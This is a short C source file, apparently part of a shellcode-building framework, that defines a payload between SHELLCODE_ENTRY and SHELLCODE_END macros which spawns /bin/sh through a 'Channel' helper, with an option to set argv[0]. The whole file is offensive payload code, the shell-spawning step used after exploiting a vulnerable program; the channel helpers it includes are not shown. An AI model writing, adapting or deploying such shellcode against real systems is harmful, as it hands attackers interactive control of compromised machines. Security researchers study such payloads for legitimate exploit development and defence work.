#include <factory.h>

#include "helpers/channel.c"
#include "helpers/process.c"

SHELLCODE_ENTRY {

#if (SET_ARGV0 == 1)
    char *const argv[] = { "/bin/sh", NULL };
#else
    char *const argv[] = { NULL };
#endif
    char *const envp[] = { NULL };

    Channel channel;
    execute("/bin/sh", argv, envp, channel);

} SHELLCODE_END
